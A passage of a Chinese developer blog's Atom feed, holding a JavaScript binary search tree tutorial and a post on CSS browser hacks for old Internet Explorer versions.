      &lt;h4 id=&quot;清除浮动&quot;&gt;&lt;a href=&quot;#清除浮动&quot; class=&quot;headerlink&quot; title=&quot;清除浮动&quot;&gt;&lt;/a&gt;清除浮动&lt;/h4&gt;&lt;h5 id=&quot;clear&quot;&gt;&lt;a href=&quot;#clear&quot; class=&quot;headerlink&quot; title=&quot;clear&quot;&gt;&lt;/a&gt;clear&lt;/h5&gt;&lt;figure class=&quot;highlight css&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;/* 放在浮动元素之后清除浮动 */&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;selector-class&quot;&gt;.clear&lt;/span&gt; &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;attribute&quot;&gt;clear&lt;/span&gt;: both;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="Front-End" scheme="http://youngdze.co/categories/Front-End/"/>
    
    
  </entry>
  
  <entry>
    <title>JavaScript 二叉树</title>
    <link href="http://youngdze.co/2015/10/22/javascript-binary-search-tree/"/>
    <id>http://youngdze.co/2015/10/22/javascript-binary-search-tree/</id>
    <published>2015-10-22T10:50:24.000Z</published>
    <updated>2016-12-05T04:55:42.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>像我这种野生程序员连各大公司校招笔试都过不了，主要是数据结构和算法薄弱，今天小米出了道二叉树，考二叉树的分层遍历，我当然是不会做，然后就没有然后了。</p></blockquote><h4 id="节点定义"><a href="#节点定义" class="headerlink" title="节点定义"></a>节点定义</h4><p>二叉树节点定义：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">Node</span>(<span class="params">data, left, right</span>) </span>&#123;</div><div class="line">    <span class="keyword">this</span>.data = data;</div><div class="line">    <span class="keyword">this</span>.left = left;</div><div class="line">    <span class="keyword">this</span>.right = right;</div><div class="line">&#125;</div></pre></td></tr></table></figure><a id="more"></a><p>给 <code>Node</code> 添加一个获得当前节点数据的方法：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">Node.prototype.getData = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.data;</div><div class="line">&#125;;</div></pre></td></tr></table></figure><h4 id="二叉树定义"><a href="#二叉树定义" class="headerlink" title="二叉树定义"></a>二叉树定义</h4><p>定义二叉树，初始根节点为 null：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">BST</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="keyword">this</span>.root = <span class="literal">null</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure><h4 id="插入"><a href="#插入" class="headerlink" title="插入"></a>插入</h4><p>二叉树的插入规则：</p><ol><li>是否有根节点，没有则设插入节点为根节点2.  比当前节点值小，转 3，否则转 43.  是否有左叶子节点，没有则设插入节点为当前节点左叶子节点，否则设其左叶子节点为当前节点，转 24.  是否有右叶子节点，没有则设插入节点为当前结点右叶子节点，否则设其右叶子节点为当前节点， 转 2</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">BST.prototype.insert = <span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</div><div class="line">    <span class="keyword">let</span> n = <span class="keyword">new</span> Node(data, <span class="literal">null</span>, <span class="literal">null</span>);</div><div class="line">    <span class="keyword">if</span> (!<span class="keyword">this</span>.root) &#123;</div><div class="line">        <span class="keyword">this</span>.root = n;</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        <span class="keyword">let</span> current = <span class="keyword">this</span>.root;</div><div class="line">        <span class="keyword">let</span> parent;</div><div class="line">        <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</div><div class="line">            parent = current;</div><div class="line">            <span class="keyword">if</span> (data &lt; current.getData()) &#123;</div><div class="line">                current = current.left;</div><div class="line">                <span class="keyword">if</span> (!current) &#123;</div><div class="line">                    parent.left = n;</div><div class="line">                    <span class="keyword">break</span>;</div><div class="line">                &#125;</div><div class="line">            &#125; <span class="keyword">else</span> &#123;</div><div class="line">                current = current.right;</div><div class="line">                <span class="keyword">if</span> (!current) &#123;</div><div class="line">                    parent.right = n;</div><div class="line">                    <span class="keyword">break</span>;</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure><h4 id="获取最小值"><a href="#获取最小值" class="headerlink" title="获取最小值"></a>获取最小值</h4><p>在二叉树中，由于较小值都是在左节点，所以遍历完左节点即可</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">BST.prototype.getMin = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="keyword">if</span> (!<span class="keyword">this</span>.root) <span class="keyword">return</span> <span class="literal">null</span>;</div><div class="line">    <span class="keyword">let</span> current = <span class="keyword">this</span>.root;</div><div class="line">    <span class="keyword">while</span> (current.left) &#123;</div><div class="line">        current = current.left;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> current.getData();</div><div class="line">&#125;</div></pre></td></tr></table></figure><h4 id="获取最大值"><a href="#获取最大值" class="headerlink" title="获取最大值"></a>获取最大值</h4><p>在二叉树中，由于较大值都是在右节点，所以遍历完右节点即可</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">BST.prototype.getMax = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="keyword">if</span> (!<span class="keyword">this</span>.root) <span class="keyword">return</span> <span class="literal">null</span>;</div><div class="line">    <span class="keyword">let</span> current = <span class="keyword">this</span>.root;</div><div class="line">    <span class="keyword">while</span> (current.right) &#123;</div><div class="line">        current = current.right;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> current.getData();</div><div class="line">&#125;</div></pre></td></tr></table></figure><h4 id="获取节点数量"><a href="#获取节点数量" class="headerlink" title="获取节点数量"></a>获取节点数量</h4><p>总节点 = 左节点 + 右节点 + 1</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">BST.prototype.countNode = <span class="function"><span class="keyword">function</span>(<span class="params">node</span>) </span>&#123;</div><div class="line">    <span class="keyword">if</span> (!node) <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.countNode(node.left) + <span class="keyword">this</span>.countNode(node.right) + <span class="number">1</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure><h4 id="中序遍历"><a href="#中序遍历" class="headerlink" title="中序遍历"></a>中序遍历</h4><p>规则是先遍历左节点，然后到根节点，最后到右节点，图示(来自 <a href="https://en.wikipedia.org/wiki/Tree_traversal?oldformat=true" target="_blank" rel="external">Wikipedia</a>)：</p><p><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/77/Sorted_binary_tree_inorder.svg/440px-Sorted_binary_tree_inorder.svg.png" alt="inOrder"></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">BST.prototype.inOrder = <span class="function"><span class="keyword">function</span>(<span class="params">node</span>) </span>&#123;</div><div class="line">    <span class="keyword">if</span> (node) &#123;</div><div class="line">        inOrder(node.left);</div><div class="line">        <span class="built_in">console</span>.log(node.getData());</div><div class="line">        inOrder(node.right);</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure><h4 id="先序遍历"><a href="#先序遍历" class="headerlink" title="先序遍历"></a>先序遍历</h4><p>规则是从根节点开始，先左节点，再右节点，图示(来自 <a href="https://en.wikipedia.org/wiki/Tree_traversal?oldformat=true" target="_blank" rel="external">Wikipedia</a>)：</p><p><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/d/d4/Sorted_binary_tree_preorder.svg/440px-Sorted_binary_tree_preorder.svg.png" alt="preOrder"></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">BST.prototype.preOrder = <span class="function"><span class="keyword">function</span>(<span class="params">node</span>) </span>&#123;</div><div class="line">    <span class="keyword">if</span> (node) &#123;</div><div class="line">        <span class="built_in">console</span>.log(node.getData());</div><div class="line">        preOrder(node.left);</div><div class="line">        preOrder(node.right);</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure><h4 id="后序遍历"><a href="#后序遍历" class="headerlink" title="后序遍历"></a>后序遍历</h4><p>规则是从左节点开始，再右节点，最后到根节点，图示(来自 <a href="https://en.wikipedia.org/wiki/Tree_traversal?oldformat=true" target="_blank" rel="external">Wikipedia</a>)：</p><p><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/9d/Sorted_binary_tree_postorder.svg/440px-Sorted_binary_tree_postorder.svg.png?1445511399697" alt="postOrder"></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">BST.prototype.postOrder = <span class="function"><span class="keyword">function</span>(<span class="params">node</span>) </span>&#123;</div><div class="line">    <span class="keyword">if</span> (node) &#123;</div><div class="line">        postOrder(node.left);</div><div class="line">        postOrder(node.right);</div><div class="line">        <span class="built_in">console</span>.log(node.getData());</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure><h4 id="分层遍历广度查询-Breadth-First-Search"><a href="#分层遍历广度查询-Breadth-First-Search" class="headerlink" title="分层遍历广度查询(Breadth First Search)"></a>分层遍历广度查询(Breadth First Search)</h4><p>分层遍历相对复杂，它是一层一层进行遍历的，图示(来自 <a href="https://en.wikipedia.org/wiki/Tree_traversal?oldformat=true" target="_blank" rel="external">Wikipedia</a>)：</p><p><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/d/d1/Sorted_binary_tree_breadth-first_traversal.svg/320px-Sorted_binary_tree_breadth-first_traversal.svg.png" alt="level tranverse"></p><p>具体思路是先定义一个数组，然后把各层节点在每次循环压入这个数组，每次循环都将这一层节点的值打印出来，同时设置循环结束条件为当前结点为最后节点。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">BST.prototype.levelTraverse = <span class="function"><span class="keyword">function</span>(<span class="params">node</span>) </span>&#123;</div><div class="line">    <span class="keyword">if</span> (!node) <span class="keyword">return</span>;</div><div class="line">    <span class="keyword">let</span> q = [node],</div><div class="line">        current = <span class="number">0</span>,</div><div class="line">        last = <span class="number">1</span>;</div><div class="line">    <span class="keyword">while</span> (current &lt; q.length) &#123;</div><div class="line">        last = q.length;</div><div class="line">        <span class="keyword">let</span> A = [];</div><div class="line">        <span class="keyword">while</span> (current &lt; last) &#123;</div><div class="line">            A.push(q[current].getData());</div><div class="line">            <span class="keyword">if</span> (q[current].left) &#123;</div><div class="line">                q.push(q[current].left);</div><div class="line">            &#125;</div><div class="line">            <span class="keyword">if</span> (q[current].right) &#123;</div><div class="line">                q.push(q[current].right);</div><div class="line">            &#125;</div><div class="line">            current++;</div><div class="line">        &#125;</div><div class="line">        <span class="built_in">console</span>.log(A.toString());</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure><h4 id="查找"><a href="#查找" class="headerlink" title="查找"></a>查找</h4><p>查找其实相对简单，毕竟查找数值与当前结点，小则循环到左节点，大则循环到右节点，等于则返回，查找不到返回 null。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">BST.prototype.find = <span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</div><div class="line">    <span class="keyword">let</span> current = <span class="keyword">this</span>.root;</div><div class="line">    <span class="keyword">while</span> (current) &#123;</div><div class="line">        <span class="keyword">if</span> (<span class="built_in">Object</span>.is(data, current.getData())) &#123;</div><div class="line">            <span class="keyword">return</span> current;</div><div class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (data &lt; current.getData()) &#123;</div><div class="line">            current = current.left;</div><div class="line">        &#125; <span class="keyword">else</span> &#123;</div><div class="line">            current = current.right;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure><h4 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h4><p>这里有个视频讲解非常详细，不过要自备梯子：<a href="https://youtu.be/gcULXE7ViZw" target="_blank" rel="external">Delete a node from Binary Search Tree</a></p><iframe width="560" height="315" src="https://www.youtube.com/embed/gcULXE7ViZw" frameborder="0" allowfullscreen></iframe><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line">BST.prototype.deleteNode = <span class="function"><span class="keyword">function</span>(<span class="params">node, data</span>) </span>&#123;</div><div class="line">    <span class="keyword">if</span> (!node) &#123;</div><div class="line">        <span class="keyword">return</span> node;</div><div class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (data &lt; node.data) &#123;</div><div class="line">        node.left = <span class="keyword">this</span>.deleteNode(node.left, data);</div><div class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (data &gt; node.data) &#123;</div><div class="line">        node.right = <span class="keyword">this</span>.deleteNode(node.right, data);</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        <span class="keyword">if</span> ((!node.left) &amp;&amp; (!node.right)) &#123;</div><div class="line">            node = <span class="literal">null</span>;</div><div class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!node.left) &#123;</div><div class="line">            node = node.right;</div><div class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!node.right) &#123;</div><div class="line">            node = node.left;</div><div class="line">        &#125; <span class="keyword">else</span> &#123;</div><div class="line">            <span class="keyword">let</span> temp = node.right.getMin();</div><div class="line">            node.data = temp;</div><div class="line">            node.right = <span class="keyword">this</span>.deleteNode(node.right, temp);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> node;</div><div class="line">&#125;</div><div class="line"></div><div class="line">BST.prototype.delete = <span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</div><div class="line">    <span class="keyword">this</span>.root = <span class="keyword">this</span>.deleteNode(<span class="keyword">this</span>.root, data);</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>全部代码在 <a href="https://github.com/youngdze/js-algorithms/blob/master/lib/dataStructures/binarySearchTree.js" target="_blank" rel="external">Github</a>。</p><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><ul><li><a href="http://blog.csdn.net/luckyxiaoqiang/article/details/7518888" target="_blank" rel="external">http://blog.csdn.net/luckyxiaoqiang/article/details/7518888</a></li><li><a href="https://en.wikipedia.org/wiki/Tree_traversal" target="_blank" rel="external">https://en.wikipedia.org/wiki/Tree_traversal</a></li><li><a href="https://youtu.be/gcULXE7ViZw" target="_blank" rel="external">https://youtu.be/gcULXE7ViZw</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;像我这种野生程序员连各大公司校招笔试都过不了，主要是数据结构和算法薄弱，今天小米出了道二叉树，考二叉树的分层遍历，我当然是不会做，然后就没有然后了。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h4 id=&quot;节点定义&quot;&gt;&lt;a href=&quot;#节点定义&quot; class=&quot;headerlink&quot; title=&quot;节点定义&quot;&gt;&lt;/a&gt;节点定义&lt;/h4&gt;&lt;p&gt;二叉树节点定义：&lt;/p&gt;
&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;Node&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;data, left, right&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;.data = data;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;.left = left;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;.right = right;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="Algorithm" scheme="http://youngdze.co/categories/Algorithm/"/>
    
    
      <category term="binary search tree" scheme="http://youngdze.co/tags/binary-search-tree/"/>
    
  </entry>
  
  <entry>
    <title>CSS Hack</title>
    <link href="http://youngdze.co/2015/10/18/css-hack/"/>
    <id>http://youngdze.co/2015/10/18/css-hack/</id>
    <published>2015-10-18T05:21:22.000Z</published>
    <updated>2016-12-05T05:36:07.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>本篇文章就是为了我去前端笔试面试而写的，参考 <a href="http://www.webdevout.net/css-hacks" target="_blank" rel="external">CSS hacks</a> 和 <a href="http://browserhacks.com/" target="_blank" rel="external">Browserhacks</a>。</p></blockquote> <a id="more"></a><h4 id="IE-有条件执行"><a href="#IE-有条件执行" class="headerlink" title="IE 有条件执行"></a>IE 有条件执行</h4><p><strong>语法</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="comment">&lt;!--[if condition]&gt; HTML &lt;![endif]--&gt;</span></div><div class="line"><span class="comment">&lt;!--[if !condition]&gt; HTML &lt;![endif]--&gt;</span></div></pre></td></tr></table></figure><p>等于</p><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="comment">&lt;!--[if IE8]&gt;</span></div><div class="line"><span class="comment">&lt;script src="lib/html5shiv.js"&gt;</span></div><div class="line"><span class="comment">&lt;![endif]--&gt;</span></div></pre></td></tr></table></figure><p>小于</p><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="comment">&lt;!--[if lt IE8]&gt;</span></div><div class="line"><span class="comment">&lt;script src="lib/html5shiv.js"&gt;</span></div><div class="line"><span class="comment">&lt;![endif]--&gt;</span></div></pre></td></tr></table></figure><p>小于或等于</p><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="comment">&lt;!--[if lte IE8]&gt;</span></div><div class="line"><span class="comment">&lt;script src="lib/html5shiv.js"&gt;</span></div><div class="line"><span class="comment">&lt;![endif]--&gt;</span></div></pre></td></tr></table></figure><p>大于或等于</p><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="comment">&lt;!--[if gte IE8]&gt;</span></div><div class="line"><span class="comment">&lt;script src="lib/html5shiv.js"&gt;</span></div><div class="line"><span class="comment">&lt;![endif]--&gt;</span></div></pre></td></tr></table></figure><p>大于</p><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="comment">&lt;!--[if gt IE8]&gt;</span></div><div class="line"><span class="comment">&lt;script src="lib/html5shiv.js"&gt;</span></div><div class="line"><span class="comment">&lt;![endif]--&gt;</span></div></pre></td></tr></table></figure><p>不大于</p><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="comment">&lt;!--[if !gt IE8]&gt;</span></div><div class="line"><span class="comment">&lt;script src="lib/html5shiv.js"&gt;</span></div><div class="line"><span class="comment">&lt;![endif]--&gt;</span></div></pre></td></tr></table></figure><p>不是</p><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="comment">&lt;!--[if !IE]&gt;</span></div><div class="line"><span class="comment">&lt;script src="lib/html5shiv.js"&gt;</span></div><div class="line"><span class="comment">&lt;![endif]--&gt;</span></div></pre></td></tr></table></figure><h4 id="CSS-selectors"><a href="#CSS-selectors" class="headerlink" title="CSS selectors"></a>CSS selectors</h4><h5 id="这些实际上是用了浏览器的-bug-来实现的"><a href="#这些实际上是用了浏览器的-bug-来实现的" class="headerlink" title="这些实际上是用了浏览器的 bug 来实现的"></a>这些实际上是用了浏览器的 bug 来实现的</h5><p>IE6 和以下 IE 版本</p><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">* <span class="selector-tag">html</span> &#123;&#125;</div></pre></td></tr></table></figure><p>IE7 和以下 IE 版本（包括 IE6）</p><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">*<span class="selector-pseudo">:first-child+html</span> &#123;&#125; * <span class="selector-tag">html</span>&#123;&#125;</div></pre></td></tr></table></figure><p>IE7 only</p><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">*<span class="selector-pseudo">:first-child+html</span> &#123;&#125;</div></pre></td></tr></table></figure><p>IE7 和现代浏览器 only</p><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">html</span>&gt;<span class="selector-tag">body</span> &#123;&#125;</div></pre></td></tr></table></figure><p>只用于现代浏览器(IE8 and above)</p><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">html</span>&gt;<span class="comment">/**/</span><span class="selector-tag">body</span> &#123;&#125;</div></pre></td></tr></table></figure><p>用法(以 IE7 only 为例)</p><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">*<span class="selector-pseudo">:first-child+html</span> <span class="selector-id">#foo</span> <span class="selector-class">.bar</span> &#123;&#125;</div></pre></td></tr></table></figure><h4 id="important"><a href="#important" class="headerlink" title="!important"></a>!important</h4><p>由于 IE6 及以下版本 IE 不支持 <code>!important</code>，所以如以下 CSS IE6 及以下版本会使用后面的样式</p><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">p</span> &#123;</div><div class="line">    <span class="attribute">background</span>: green <span class="meta">!important</span>;   <span class="comment">/* 主流浏览器识别标识符 */</span></div><div class="line">    <span class="attribute">background</span>: red;    <span class="comment">/* IE6 和以下版本 IE 识别 */</span></div><div class="line">&#125;</div></pre></td></tr></table></figure><h4 id="import"><a href="#import" class="headerlink" title="@import"></a>@import</h4><p>IE7 及以下版本不支持 <code>@import</code>，<a href="http://www.webdevout.net/css-hacks" target="_blank" rel="external">CSS Hacks</a> 的解决做法是给非 IE7 及以下版本添加一个 css <code>@import &quot;non-ie.css&quot; all;</code>，怎么看都太奇葩了。</p><h4 id="property-value-和-property-value"><a href="#property-value-和-property-value" class="headerlink" title="_property: value 和 -property: value"></a>_property: value 和 -property: value</h4><p>只有 IE6 及以下版本 IE 支持这种 hack，并且这种 CSS 写法是非法的，当然如果想只用与 IE6 及以下版本 IE 就可以这样写。 其实 IE6 及以下版本 IE 不会对 CSS 属性前缀为非字母的属性报错才有这种 hack。</p><h4 id="property-value"><a href="#property-value" class="headerlink" title="*property: value"></a>*property: value</h4><p>IE7 修复了 CSS 属性为 <code>-</code> 和 <code>_</code> 同样识别的问题，当其他非字母前缀应用还是可以，比如 <code>*</code>，所以这种 hack 可以用于 IE7 及其以下版本。</p><h4 id="gt-body"><a href="#gt-body" class="headerlink" title="&gt;body"></a>&gt;body</h4><p><code>&gt;body</code> 按标准是错误的 CSS 写法，但 IE7 会将其视为合法选择器等同于 <code>*&gt;body</code>，同样对于 <code>*+p</code> 之类 IE7 也会视为 <code>*+p</code>，不过其他浏览器则会无视这个错误的选择器，因此这种 hack 可以用于 IE7。</p><h4 id="html"><a href="#html" class="headerlink" title="html*"></a>html*</h4><p><code>html*</code> 按标准是错误的 CSS 写法，但 IE7 会将其视为合法等同于 <code>html *</code>，而 <code>**</code> 则会视为 <code>* *</code>，这种 hack 可以用于 IE7 及以下版本。</p><h4 id="ie"><a href="#ie" class="headerlink" title="!ie"></a>!ie</h4><p><code>!ie</code> 按标准是错误的 CSS 写法，但 IE7 会将其视为合法，主要是它修复 <code>!important</code> 问题时又出现的问题，甚至你在 <code>!</code> 加任何字母都是合法的，这种 hack 可以用于 IE7 及以下版本。</p><h4 id="important-1"><a href="#important-1" class="headerlink" title="!important!"></a>!important!</h4><p>好吧这个在 IE7 也是合法的，真是个巨坑。</p><h4 id="property-value-9"><a href="#property-value-9" class="headerlink" title="property: value\9"></a>property: value\9</h4><p>一开始看到我也是想“这什么鬼写法”，它确实是在 IE6~IE8 起作用的。</p><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="selector-class">.selector</span> &#123; <span class="attribute">property</span>: value\<span class="number">9</span>; &#125;</div><div class="line">.selector &#123; property/*\**/: value\9; &#125;</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
